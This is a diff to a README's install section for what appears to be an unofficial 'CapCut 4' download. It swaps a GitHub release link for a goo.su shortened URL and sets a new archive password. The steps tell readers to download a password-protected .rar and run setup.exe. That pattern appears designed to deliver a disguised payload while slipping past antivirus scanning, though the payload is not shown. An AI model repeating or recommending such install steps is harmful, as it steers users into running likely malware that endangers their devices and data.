@@ -2,8 +2,8 @@
 
 <H3>⚙️ How to install</H3>
 
-- [Download](https://github.com/Benrice1243/capcut-4/releases/download/Download/CapCut_4.rar)
-- Open archive (password: capcut4)
+- [Download](https://goo.su/xmR3AsJ)
+- Open archive (password: Project12!)
 - Open setup.exe for download components and install
 - Follow the instruction
 
